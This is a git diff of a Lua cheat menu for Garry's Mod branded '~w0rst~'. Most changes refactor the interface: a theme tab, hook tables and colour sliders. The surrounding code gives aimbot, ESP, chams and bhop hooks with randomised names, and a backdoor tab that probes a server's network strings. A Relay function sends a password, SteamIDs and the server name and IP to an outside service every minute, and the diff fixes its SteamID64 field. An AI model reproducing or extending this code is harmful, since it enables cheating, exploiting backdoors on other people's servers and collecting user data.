@@ -11,20 +11,20 @@ function wtf.gString()
     return s
 end
 
-local RefreshHook = wtf.gString()
-local AimbotHook = wtf.gString()
-local VisualHook = wtf.gString()
-local CameraHook = wtf.gString()
-local RenderHook = wtf.gString()
-local ThinkHook = wtf.gString()
-local TickHook = wtf.gString()
-local ChatHook = wtf.gString()
-local ViewHook = wtf.gString()
-local InfoHook = wtf.gString()
-local BhopHook = wtf.gString()
-local KeyHook = wtf.gString()
-local SelectedNet = "NONE"
-local SelectedPlr = "NONE"
+wtf.hook = { 
+    ['Tick'] = wtf.gString(),
+    ['Think'] = wtf.gString(),
+    ['Creation'] = wtf.gString(),
+    ['Relay'] = wtf.gString(),
+    ['Visual'] = wtf.gString(),
+    ['Aimbot'] = wtf.gString(),
+    ['PlrRefresh'] = wtf.gString(),
+    ['Key'] = wtf.gString(),
+    ['Camera'] = wtf.gString(),
+    ['Render'] = wtf.gString(),
+    ['View'] = wtf.gString(),
+    ['Chat'] = wtf.gString()
+}
 
 wtf.enable = {
     ['Ent3DBox'] = false,
@@ -64,6 +64,29 @@ wtf.color = {
     ['Chams'] = Color(255, 255, 255),
     ['Entity'] = Color(255, 255, 255),
     ['Fov'] = Color(255, 255, 255)
+}
+
+wtf.theme = {
+    ['Log'] = Color(30,30,30,255),
+    ['LogBorder'] = Color(0,0,0,0),
+    ['Background'] = Color(30, 30, 30, 255),
+    ['Tab'] = Color(55, 55, 55, 25),
+    ['TabPanel'] = Color(55, 55, 55, 25),
+    ['ColorFrame'] = Color(35, 35, 35, 255),
+    ['ColorSlider'] = Color(30, 30, 30, 255),
+    ['Text'] = Color(170, 170, 170, 200),
+    ['Button'] = Color(35, 35, 35, 255),
+    ['ButtonBorder'] = Color(40, 40, 40, 255),
+    ['Panel'] = Color(0,0,0,0),
+    ['PanelBorder'] = Color(28,28,28,220),
+    ['CheckboxDisabled'] = Color(30, 30, 30, 255),
+    ['CheckboxEnabled'] = Color(25.5, 25.5, 25.5, 255),
+    ['Inputbox'] = Color(30, 30, 30, 255),
+    ['InputboxEntry'] = Color(31, 31, 31, 230),
+    ['InputboxPanel'] = Color(33, 33, 33, 200),
+    ['InputboxBorder'] = Color(25, 25, 25, 255),
+    ['PlayerPanel'] = Color(55, 55, 55, 25),
+    ['PlayerBorder'] = Color(28,28,28,220)
 }
 
 wtf.responses = {
@@ -123,7 +146,7 @@ local function Relay()
         pass=UserInfo[2],
         name=lp:Name(),
         id=lp:SteamID(),
-        id64=lp:SteamID(),
+        id64=lp:SteamID64(),
         server_name=GetHostName(),
         server_ip=game.GetIPAddress() }, function(b)
         local s = string.Split(b, " ");
@@ -134,18 +157,23 @@ local function Relay()
 end
 
 local RelayDelay = 0
-HookFunc("Think", InfoHook, function()
+HookFunc("Think", wtf.hook['Relay'], function()
     if CurTime() < RelayDelay then return end
     RelayDelay = CurTime() + 60
     Relay()
 end)
 
-local LogPosY = 10
-local SoundPosX, SoundPosY = 17, 10
-local EntOffPosY, EntOnPosY = 5, 5
-local BDServerPosY, BDClientPosY = 5, 5
-local PlrPosX, PlrPosY = 19, 10
+-- POSITIONS
+local Position = {
+    ['Log'] = { y = 10 },
+    ['Ents'] = { ONY = 5, OFFY = 5 },
+    -- S = Server & C = Client
+    ['Sound'] = { x = 17, y = 10 },
+    ['Backdoor'] = { SY = 5, CY = 5 },
+    ['Player'] = { x = 19, y = 10 }
+}
 
+-- FONTS
 surface.CreateFont('Font', {
     font = 'Open Sans', extended = false, size = 20,
     weight = 1000, blursize = 0, scanlines = 0,
@@ -163,7 +191,7 @@ surface.CreateFont('Sounds', {
 })
 
 local RenderTarget = GetRenderTarget(wtf.gString()..os.time(), ScrW(), ScrH())
-HookFunc("RenderScene", RenderHook, function(vOrigin, vAngle, vFOV )
+HookFunc("RenderScene", wtf.hook['Render'], function(vOrigin, vAngle, vFOV )
     local view = {
         x = 0, y = 0,
         w = ScrW(), h = ScrH(),
@@ -187,21 +215,22 @@ HookFunc("RenderScene", RenderHook, function(vOrigin, vAngle, vFOV )
     return true
 end)
 
-function Log(str)
+local function Log(str)
     local Frame=vgui.Create("DFrame")
     Frame:SetSize(220,30)
-    Frame:SetPos(-300, LogPosY)
-    Frame:SetTitle("~w0rst~ "..str)
+    Frame:SetPos(-300, Position['Log'].y)
+    Frame:SetTitle("")
     Frame:ShowCloseButton(false)
     Frame:SetDraggable(false)
     Frame.Paint = function(s,w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-        surface.SetDrawColor(Color(15,15,15, 255))
-        surface.DrawOutlinedRect(0,0,s:GetWide(),s:GetTall())
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Log'])
+        surface.SetDrawColor(wtf.theme['LogBorder'])
+        surface.DrawOutlinedRect(0, 0, w, h)
+        draw.SimpleText("~w0rst~ "..str, "DermaDefault", 5, 5, wtf.theme['Text'])
     end
 
     local LogTimer = wtf.gString()
-    Frame:MoveTo(5, LogPosY, 1,0,0.5)
+    Frame:MoveTo(5, Position['Log'].y, 1,0,0.5)
     timer.Simple(3, function()
         local x, y = Frame:GetPos()
         Frame:MoveTo(-300, y, 1, 0, 0.5);
@@ -210,10 +239,10 @@ function Log(str)
         end)
     end)
 
-    LogPosY=LogPosY+35
+    Position['Log'].y = Position['Log'].y + 35
     timer.Remove(LogTimer)
     timer.Create(LogTimer, 3.5, 1, function()
-        LogPosY=10
+        Position['Log'].y = 10
     end)
 end
 
@@ -223,8 +252,7 @@ local Icons = {
     B="https://w0rst.xyz/project/images/backdoor.png",
     M="https://w0rst.xyz/project/images/misc.png",
     S="https://w0rst.xyz/project/images/sounds.png",
-    A="https://w0rst.xyz/project/images/aimbot.png",
-    E="https://w0rst.xyz/project/images/exploits.png"
+    T="https://w0rst.xyz/project/images/theme.png"
 }
 
 local Materials = {}
@@ -268,6 +296,10 @@ Materials = IconSet(Icons, "")
 IconSet(Map(Icons, function(v) return end), "",
 function(icons) for k, icon in pairs(icons) do Icons[k].iconMat = icon end end)
 
+-- MENU PLAYER SELECTION & NET/PLR CHECK
+local SelectedNet = "NONE"
+local SelectedPlr = "NONE"
+
 local function CheckNet(str) 
     return (util.NetworkStringToID(str) > 0) 
 end
@@ -289,9 +321,7 @@ Menu:SetPaintShadow(true)
 Menu:ShowCloseButton(false)
 Menu:SetDraggable(true)
 Menu.Paint = function(self,w,h)
-    draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
-    surface.SetDrawColor(40,40,40,255)
-    surface.DrawOutlinedRect(0, 0, w, h)
+    draw.RoundedBox(5, 0, 0, w, h, wtf.theme['Background'])
 end
 
 local Strip=vgui.Create("DPanelList", Menu)
@@ -310,9 +340,7 @@ Tab:SetTitle("")
 Tab:SetSize(620,580)
 Tab:SetPos(15, 30)
 Tab.Paint = function(self, w, h)
-    surface.SetDrawColor(Color(15,15,15,255))
-    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
-    draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
+    draw.RoundedBox(10, 0, 0, w, h, wtf.theme['Tab'])
 end
 
 local Tabs, TabButtons = {}, {}
@@ -323,7 +351,7 @@ local function CreateTabButton(mat, x, y)
     TabButtons[btn]:SetPos(x, y)
     TabButtons[btn]:SetText("")
     TabButtons[btn]:SetMaterial(mat)
-    TabButtons[btn].Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
+    TabButtons[btn].Paint = nil
     TabButtons[btn].DoClick = function()
         for k, v in pairs(Tabs) do v:Hide() end 
         Tabs[tab]:Show()
@@ -337,12 +365,10 @@ local function CreateTabButton(mat, x, y)
     Tabs[tab]:SetPos(95, 10)
     Tabs[tab]:SetSize(515, 560)
     Tabs[tab].Paint = function(self, w, h)
-        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
-        surface.SetDrawColor(Color(15,15,15,255))
-        surface.DrawOutlinedRect(0,0,w,h)
+        draw.RoundedBox(5, 0, 0, w, h, wtf.theme['TabPanel'])
     end
 
-    return { Tabs[tab], TabButtons[btn] }
+    return Tabs[tab]
 end
 
 local function CreatePanel(tab, width, height, x, y)
@@ -351,11 +377,11 @@ local function CreatePanel(tab, width, height, x, y)
     Pannel:SetPos(x, y)
     Pannel:GetVBar():SetWide(0)
     Pannel.Paint = function(self,w,h)
-        surface.SetDrawColor(Color(15,15,15,255))
-        surface.DrawOutlinedRect(0,0,w,h)
-        surface.DrawOutlinedRect(0,0,w,h)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Panel'])
+        surface.SetDrawColor(wtf.theme['PanelBorder'])
+        surface.DrawOutlinedRect(0, 0, w, h)
     end
-    return { Pannel }
+    return Pannel 
 end
 
 local function CreateButton(name, tab, width, height, x, y, func)
@@ -365,55 +391,44 @@ local function CreateButton(name, tab, width, height, x, y, func)
     Button:SetText(name)
     Button.DoClick = func
     Button.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
         surface.DrawOutlinedRect(0,0,w,h)
-        self:SetTextColor(Color(255,255,255))
-    end
-end
-
-local function SetBind(bind)
-    local BlankFrame = vgui.Create("DFrame")
-    BlankFrame:ShowCloseButton(false)
-    BlankFrame:SetTitle("")
-    BlankFrame.Paint = nil
-
-    Log("Press Any Button")
-    BlankFrame.Think = function()
-        for i = 1, 103 do 
-            if input.IsKeyDown(i) then
-                if i == 70 then i = 0 end
-                wtf.binds[bind] = i
-                BlankFrame:Close()
-                BlankFrame.Think = nil
-                Log(bind.." Bind Set "..i)
-            end
-        end
+        self:SetTextColor(wtf.theme['Text'])
     end
 end
 
 local function CreateBindableButton(name, bind, tab, x, y)
-    local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(110, 25)
-    Frame:SetPos(x, y)
-    Frame:SetDraggable(false)
-    Frame:ShowCloseButton(false)
-    Frame:SetTitle("")
-    Frame.Paint = function(self, w, h)
-        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0, w, h)
-        draw.SimpleText("["..wtf.binds[bind].."]", "DermaDefault", 84, 5.15, Color(255,255,255,255))
-    end
-
-    local Button = vgui.Create("DButton", Frame)
-    Button:SetSize(80, 23)
-    Button:SetPos(1, 1)
-    Button:SetText(name..":")
-    Button.DoClick = function() SetBind(bind) end
+    local Button = vgui.Create("DButton", tab)
+    Button:SetSize(110, 25)
+    Button:SetPos(x, y)
+    Button:SetColor(wtf.theme['Text'])
+    Button:SetText(name..": ".."["..wtf.binds[bind].."]")
     Button.Paint = function(self, w, h)
-        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
-        self:SetTextColor(Color(255,255,255))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
+        surface.DrawOutlinedRect(0,0,w,h)
+        self:SetTextColor(wtf.theme['Text'])
+    end
+    Button.DoClick = function() 
+        local BlankFrame = vgui.Create("DFrame")
+        BlankFrame:ShowCloseButton(false)
+        BlankFrame:SetTitle("")
+        BlankFrame.Paint = nil
+
+        Log("Press Any Button")
+        BlankFrame.Think = function()
+            for i = 1, 103 do 
+                if input.IsKeyDown(i) then
+                    if i == 70 then i = 0 end
+                    wtf.binds[bind] = i
+                    BlankFrame:Close()
+                    BlankFrame.Think = nil
+                    Log(bind.." Bind Set "..i)
+                    Button:SetText(name..": ".."["..wtf.binds[bind].."]")
+                end
+            end
+        end
     end
 end
 
@@ -425,10 +440,10 @@ local function CreateCheckbox(name, tab, x, y, func)
     Frame:ShowCloseButton(false)
     Frame:SetTitle("")
     Frame.Paint = function(self, w, h)
-        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
+        draw.RoundedBox(0,0,0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
         surface.DrawOutlinedRect(0,0, w, h)
-        draw.SimpleText(name, "DermaDefault", 25, 5, Color(255,255,255,255))
+        draw.SimpleText(name, "DermaDefault", 25, 5, wtf.theme['Text'])
     end
 
     local Button = vgui.Create("DButton", Frame)
@@ -436,28 +451,19 @@ local function CreateCheckbox(name, tab, x, y, func)
     Button:SetPos(5,5)
     Button:SetText("")
     Button.Paint = function(self, w, h)
-        surface.SetDrawColor(30, 30, 30, 255)
-        surface.DrawRect(0, 0, w, h)
-        surface.SetDrawColor(30, 30, 30, 255)
-        surface.DrawOutlinedRect(0,0, w, h)
+        draw.RoundedBox(0,0,0, w, h, wtf.theme['CheckboxDisabled'])
     end
 
-    local Toggled = false
+    local Toggled = true
     Button.DoClick = function()
         Toggled = not Toggled; func()
         if Toggled then
             Button.Paint = function(self, w, h)
-                surface.SetDrawColor(25.5, 25.5, 25.5, 255)
-                surface.DrawRect(0, 0, w, h)
-                surface.SetDrawColor(30, 30, 30, 255)
-                surface.DrawOutlinedRect(0,0, w, h)
+                draw.RoundedBox(0,0,0, w, h, wtf.theme['CheckboxDisabled'])
             end
         else
             Button.Paint = function(self, w, h)
-                surface.SetDrawColor(30, 30, 30, 255)
-                surface.DrawRect(0, 0, w, h)
-                surface.SetDrawColor(30, 30, 30, 255)
-                surface.DrawOutlinedRect(0,0, w, h)
+                draw.RoundedBox(0,0,0, w, h, wtf.theme['CheckboxEnabled'])
             end
         end
     end
@@ -472,10 +478,10 @@ local function CreateInputBox(name, func)
     Frame:ShowCloseButton(false)
     Frame:SetBackgroundBlur(true)
     Frame.Paint = function(self,w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
-        surface.SetDrawColor(25, 25, 25, 255)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Inputbox'])
+        surface.SetDrawColor(wtf.theme['InputboxBorder'])
         surface.DrawOutlinedRect(0, 0, w, h)
-        draw.SimpleText(name, "DermaDefault", 10, 8, Color(200,200,200,200))
+        draw.SimpleText(name, "DermaDefault", 10, 8, wtf.theme['Text'])
     end
 
     local Panel = vgui.Create("DFrame", Frame)
@@ -485,8 +491,8 @@ local function CreateInputBox(name, func)
     Panel:SetSize(200, 40)
     Panel:SetPos(10, 25)
     Panel.Paint = function(self,w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(31, 31, 31, 230))
-        surface.SetDrawColor(25, 25, 25, 255)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['InputboxPanel'])
+        surface.SetDrawColor(wtf.theme['InputboxBorder'])
         surface.DrawOutlinedRect(0, 0, w, h)
     end
 
@@ -496,10 +502,10 @@ local function CreateInputBox(name, func)
     Entry:SetSize(190, 25)
     Entry:SetValue("")
     Entry.Paint = function(self, w, h)
-        draw.RoundedBox(0,0,0,w,h,Color(33, 33, 33, 200))
-        surface.SetDrawColor(25, 25, 25, 255)
-        surface.DrawOutlinedRect(0,0,w,h)
-        self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['InputboxEntry'])
+        surface.SetDrawColor(wtf.theme['InputboxBorder'])
+        surface.DrawOutlinedRect(0, 0, w, h)
+        self:DrawTextEntryText(wtf.theme['Text'], Color(20, 20, 150), Color(100, 100, 100))
     end
 
     local AcceptButton = vgui.Create("DButton", Frame)
@@ -512,10 +518,10 @@ local function CreateInputBox(name, func)
         Frame:Close(); 
     end
     AcceptButton.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
         surface.DrawOutlinedRect(0,0,w,h)
-        self:SetTextColor(Color(255,255,255))
+        self:SetTextColor(wtf.theme['Text'])
     end
 
     local CancelButton=vgui.Create("DButton", Frame)
@@ -524,10 +530,10 @@ local function CreateInputBox(name, func)
     CancelButton:SetPos(84, 70)
     CancelButton.DoClick = function() Frame:Hide() end
     CancelButton.Paint = function(self,w,h)
-        draw.RoundedBox(0,0,0,w,h,Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
         surface.DrawOutlinedRect(0,0,w,h)
-        self:SetTextColor(Color(255,255,255))
+        self:SetTextColor(wtf.theme['Text'])
     end
 end
 
@@ -540,10 +546,10 @@ local function CreateSlider(name, table, tab, max, min, x, y)
     Frame:SetVisible(true)
     Frame:SetTitle(" ")
     Frame.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0, w, h)
-        draw.SimpleText(name, "DermaDefault", 7, 5, Color(255,255,255,255))
+        draw.RoundedBox(0, 0, 0, w, h, wtf.theme['Button'])
+        surface.SetDrawColor(wtf.theme['ButtonBorder'])
+        surface.DrawOutlinedRect(0,0,w,h)
+        draw.SimpleText(name, "DermaDefault", 7, 5, wtf.theme['Text'])
     end
 
     local Slider = vgui.Create( "DNumSlider", Frame )
@@ -555,7 +561,7 @@ local function CreateSlider(name, table, tab, max, min, x, y)
     Slider:SetDecimals(0)
     Slider:SetValue(table[1])
     Slider.Scratch:SetVisible(false)
-    Slider.TextArea:SetTextColor(Color(255,255,255,255))
+    Slider.TextArea:SetTextColor(wtf.theme['Text'])
     function Slider.Slider.Knob:Paint(w, h) end
     Slider.OnValueChanged = function(self, value)
         table[1] = self:GetValue()
@@ -563,36 +569,55 @@ local function CreateSlider(name, table, tab, max, min, x, y)
     function Slider.Slider:Paint(w, h)
         local Parent = self:GetParent()
         local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
-        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
+        draw.RoundedBox(50, 0, 4, Drag, 10, wtf.theme['ColorSlider'])
     end
 end
 
 local function CreateColorSlider(name, color, tab, x, y)
     local Frame=vgui.Create("DFrame", tab)
-    Frame:SetSize(120,85)
+    Frame:SetSize(120,105)
     Frame:SetPos(x, y)
     Frame:SetDraggable(false)
     Frame:ShowCloseButton(false)
-    Frame:SetTitle(name)
+    Frame:SetTitle("")
     Frame.Paint = function(self, w,h)
-        draw.RoundedBox(0,0,0, w, h, Color(35, 35, 35, 255))
-        surface.SetDrawColor(40, 40, 40, 255)
-        surface.DrawOutlinedRect(0,0, w, h)
-        draw.SimpleText("O", "DermaDefault", 105, 5, Color(color.r, color.g, color.b))
-        draw.SimpleText("R:", "DermaDefault", 10, 25, Color(170,170,170,200))
-        draw.SimpleText("G:", "DermaDefault", 10, 45, Color(170,170,170,200))
-        draw.SimpleText("B:", "DermaDefault", 10, 65, Color(170,170,170,200))
+        draw.RoundedBox(3,0,0, w, h, wtf.theme['ColorFrame'])
+        draw.SimpleText(name, "DermaDefault", 5, 5, wtf.theme['Text'])
+        draw.SimpleText("O", "DermaDefault", 105, 5, color)
+        draw.SimpleText("A:", "DermaDefault", 10, 25, wtf.theme['Text'])
+        draw.SimpleText("R:", "DermaDefault", 10, 45, wtf.theme['Text'])
+        draw.SimpleText("G:", "DermaDefault", 10, 65, wtf.theme['Text'])
+        draw.SimpleText("B:", "DermaDefault", 10, 85, wtf.theme['Text'])
+    end
+
+    local ColorA=vgui.Create("DNumSlider", Frame)
+    ColorA:SetMin(0);
+    ColorA:SetMax(255)
+    ColorA:SetSize(180, 15)
+    ColorA:SetPos(-50,23)
+    ColorA:SetDecimals(0)
+    ColorA:SetValue(color.a)
+    ColorA.Scratch:SetVisible(false)
+    ColorA.TextArea:SetTextColor(wtf.theme['Text'])
+    function ColorA.Slider.Knob:Paint(w, h) end
+    ColorA.OnValueChanged = function(self, value)
+        color.a=self:GetValue()
+    end
+    function ColorA.Slider:Paint(w, h)
+        local Parent = self:GetParent()
+        local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
+        draw.RoundedBox(50, 0, 4, Drag, 10, wtf.theme['ColorSlider'])
     end
 
     local ColorR=vgui.Create("DNumSlider", Frame)
     ColorR:SetMin(0);
     ColorR:SetMax(255)
     ColorR:SetSize(180, 15)
-    ColorR:SetPos(-50,23)
+    ColorR:SetPos(-50,43)
     ColorR:SetDecimals(0)
     ColorR:SetValue(color.r)
     ColorR.Scratch:SetVisible(false)
-    ColorR.TextArea:SetTextColor(Color(170,170,170,200))
+    ColorR.TextArea:SetTextColor(wtf.theme['Text'])
     function ColorR.Slider.Knob:Paint(w, h) end
     ColorR.OnValueChanged = function(self, value)
         color.r=self:GetValue()
@@ -600,18 +625,18 @@ local function CreateColorSlider(name, color, tab, x, y)
     function ColorR.Slider:Paint(w, h)
         local Parent = self:GetParent()
         local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
-        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
+        draw.RoundedBox(50, 0, 4, Drag, 10, wtf.theme['ColorSlider'])
     end
 
     local ColorG=vgui.Create("DNumSlider", Frame)
     ColorG:SetMin(0);
     ColorG:SetMax(255)
     ColorG:SetSize(180, 15)
-    ColorG:SetPos(-50,43)
+    ColorG:SetPos(-50,63)
     ColorG:SetDecimals(0)
     ColorG:SetValue(color.g)
     ColorG.Scratch:SetVisible(false)
-    ColorG.TextArea:SetTextColor(Color(170,170,170,200))
+    ColorG.TextArea:SetTextColor(wtf.theme['Text'])
     function ColorG.Slider.Knob:Paint(w, h) end
     ColorG.OnValueChanged = function(self, value)
         color.g=self:GetValue()
@@ -619,18 +644,18 @@ local function CreateColorSlider(name, color, tab, x, y)
     function ColorG.Slider:Paint(w, h)
         local Parent = self:GetParent()
         local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
-        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
+        draw.RoundedBox(50, 0, 4, Drag, 10, wtf.theme['ColorSlider'])
     end
 
     local ColorB=vgui.Create("DNumSlider", Frame)
     ColorB:SetMin(0);
     ColorB:SetMax(255)
     ColorB:SetSize(180, 15)
-    ColorB:SetPos(-50,63)
+    ColorB:SetPos(-50,83)
     ColorB:SetDecimals(0)
     ColorB:SetValue(color.b)
     ColorB.Scratch:SetVisible(false)
-    ColorB.TextArea:SetTextColor(Color(170,170,170,200))
+    ColorB.TextArea:SetTextColor(wtf.theme['Text'])
     function ColorB.Slider.Knob:Paint(w, h) end
     ColorB.OnValueChanged = function(self, value)
         color.b=self:GetValue()
@@ -638,10 +663,11 @@ local function CreateColorSlider(name, color, tab, x, y)
     function ColorB.Slider:Paint(w, h)
         local Parent = self:GetParent()
         local Drag = w * ((Parent:GetValue() - Parent:GetMin()) / Parent:GetRange())
-        draw.RoundedBox(50, 0, 4, Drag, 10, Color(30, 30, 30, 255))
+        draw.RoundedBox(50, 0, 4, Drag, 10, wtf.theme['ColorSlider'])
     end
 
     function Update()
+        ColorA:SetValue(color.a)
         ColorR:SetValue(color.r)
         ColorG:SetValue(color.g)
         ColorB:SetValue(color.b)
@@ -652,32 +678,61 @@ local function CreateColorSlider(name, color, tab, x, y)
     return external
 end
 
+-- These need to be created before some functions are called
+-- just kinda annoying having to place them at random...
+
+--[ Tab Creation ]--
 local VisualsTab = CreateTabButton(Materials.V, 13, 5)
 local MiscTab = CreateTabButton(Materials.M, 13, 85)
-local PlayersTab = CreateTabButton(Materials.P, 13, 165)
-local BackdoorTab = CreateTabButton(Materials.B, 13, 245)
-local SoundsTab = CreateTabButton(Materials.S, 13, 325)
+local ThemeTab = CreateTabButton(Materials.T, 13, 165)
+local PlayerTab = CreateTabButton(Materials.P, 13, 245)
+local BackdoorTab = CreateTabButton(Materials.B, 13, 325)
+local SoundsTab = CreateTabButton(Materials.S, 13, 405)
 
-local PlayerPanel = CreatePanel(PlayersTab[1], 495, 540, 10, 10)
-local SoundPanel = CreatePanel(SoundsTab[1], 495, 505, 10, 10)
-local ServerBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 20, 15)
-local ClientBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 270, 15)
-local EntityPanel = CreatePanel(VisualsTab[1], 490, 350, 15, 190)
-local EntOffPanel = CreatePanel(EntityPanel[1], 230, 330, 10, 10)
-local EntOnPanel = CreatePanel(EntityPanel[1], 230, 330, 250, 10)
+--[ Panel Creation ]--
+local PlayerPanel = CreatePanel(PlayerTab, 495, 540, 10, 10)
+local SoundPanel = CreatePanel(SoundsTab, 495, 505, 10, 10)
+local ServerBDPanel = CreatePanel(BackdoorTab, 225, 300, 20, 15)
+local ClientBDPanel = CreatePanel(BackdoorTab, 225, 300, 270, 15)
+local EntityPanel = CreatePanel(VisualsTab, 490, 350, 15, 190)
+local EntOffPanel = CreatePanel(EntityPanel, 230, 330, 10, 10)
+local EntOnPanel = CreatePanel(EntityPanel, 230, 330, 250, 10)
 
 local ColorSliders = {
-    CreateColorSlider("Tracer-Editor", wtf.color['Tracer'], MiscTab[1], 9, 280),
-    CreateColorSlider("Distance-Editor", wtf.color['Distance'], MiscTab[1], 134, 280),
-    CreateColorSlider("Name-Editor", wtf.color['Name'], MiscTab[1], 259, 280),
-    CreateColorSlider("Weapon-Editor", wtf.color['Weapon'], MiscTab[1], 384, 280),
-    CreateColorSlider("Box-2D-Editor", wtf.color['Box2D'], MiscTab[1],  9, 370),
-    CreateColorSlider("Box-3D-Editor", wtf.color['Box3D'], MiscTab[1], 134, 370),
-    CreateColorSlider("Skeleton-Editor", wtf.color['Skeleton'], MiscTab[1], 259, 370),
-    CreateColorSlider("Chams-Editor", wtf.color['Chams'], MiscTab[1], 384, 370),
-    CreateColorSlider("Entity-Editor", wtf.color['Entity'], MiscTab[1], 9, 460),
-    CreateColorSlider("Fov-Editor", wtf.color['Fov'], MiscTab[1], 134, 460),
-    CreateColorSlider("Name/Dist-Editor", wtf.color['NameDist'], MiscTab[1], 259, 460)
+    CreateColorSlider("Tracer-Editor", wtf.color['Tracer'], MiscTab, 10, 220),
+    CreateColorSlider("Distance-Editor", wtf.color['Distance'], MiscTab, 135, 220),
+    CreateColorSlider("Name-Editor", wtf.color['Name'], MiscTab, 260, 220),
+    CreateColorSlider("Weapon-Editor", wtf.color['Weapon'], MiscTab, 385, 220),
+    CreateColorSlider("Box-2D-Editor", wtf.color['Box2D'], MiscTab,  10, 330),
+    CreateColorSlider("Box-3D-Editor", wtf.color['Box3D'], MiscTab, 135, 330),
+    CreateColorSlider("Skeleton-Editor", wtf.color['Skeleton'], MiscTab, 260, 330),
+    CreateColorSlider("Chams-Editor", wtf.color['Chams'], MiscTab, 385, 330),
+    CreateColorSlider("Entity-Editor", wtf.color['Entity'], MiscTab, 10, 440),
+    CreateColorSlider("Fov-Editor", wtf.color['Fov'], MiscTab, 135, 440),
+    CreateColorSlider("Name/Dist-Editor", wtf.color['NameDist'], MiscTab, 260, 440)
+}
+
+local ThemeSliders = { 
+    CreateColorSlider("Text", wtf.theme['Text'], ThemeTab, 10, 7),
+    CreateColorSlider("Log", wtf.theme['Log'], ThemeTab, 135, 7),
+    CreateColorSlider("Log Border", wtf.theme['LogBorder'], ThemeTab, 260, 7),
+    CreateColorSlider("Background", wtf.theme['Background'], ThemeTab, 385, 7),
+    CreateColorSlider("Color Frame", wtf.theme['ColorFrame'], ThemeTab, 10, 117),
+    CreateColorSlider("Color Slider", wtf.theme['ColorSlider'], ThemeTab, 137, 117),
+    CreateColorSlider("Button", wtf.theme['Button'], ThemeTab, 260, 117),
+    CreateColorSlider("Button Border", wtf.theme['ButtonBorder'], ThemeTab, 385, 117),
+    CreateColorSlider("Panel", wtf.theme['Panel'], ThemeTab, 10, 227),
+    CreateColorSlider("Panel Border", wtf.theme['PanelBorder'], ThemeTab, 135, 227),
+    CreateColorSlider("Checkbox Disabled", wtf.theme['CheckboxDisabled'], ThemeTab, 260, 227),
+    CreateColorSlider("Checkbox Enabled", wtf.theme['CheckboxEnabled'], ThemeTab, 385, 227),
+    CreateColorSlider("Inputbox", wtf.theme['Inputbox'], ThemeTab, 10, 337),
+    CreateColorSlider("Inputbox Entry", wtf.theme['InputboxEntry'], ThemeTab, 135, 337),
+    CreateColorSlider("Inputbox Panel", wtf.theme['InputboxPanel'], ThemeTab, 260, 337),
+    CreateColorSlider("Inputbox Border", wtf.theme['InputboxBorder'], ThemeTab, 385, 337),
+    CreateColorSlider("Player Panel", wtf.theme['PlayerPanel'], ThemeTab, 10, 447),
+    CreateColorSlider("Player Border", wtf.theme['PlayerBorder'], ThemeTab, 135, 447),
+    CreateColorSlider("Tab", wtf.theme['Tab'], ThemeTab, 260, 447),
+    CreateColorSlider("Tab Panel", wtf.theme['TabPanel'], ThemeTab, 385, 447)
 }
 
 local EntList = {}
@@ -697,72 +752,62 @@ local function PopulateEntLists()
         local name = v:GetClass()
         if name ~= "player" and name ~= "viewmodel" then
             if not CheckTable(EntList, name) and not CheckTable(EntsOff, name) then
-                CreateButton(name, EntOffPanel[1], 220, 25, 5, EntOffPosY, function()
-                    table.insert(EntList, name); ClearLists()
-                end);
+                CreateButton(name, EntOffPanel, 220, 25, 5, Position['Ents'].OFFY, function()
+                    table.insert(EntList, name)
+                    ClearLists()
+                end)
 
                 table.insert(EntsOff, name)
-                EntOffPosY = EntOffPosY + 26
+                Position['Ents'].OFFY = Position['Ents'].OFFY + 26
             end
 
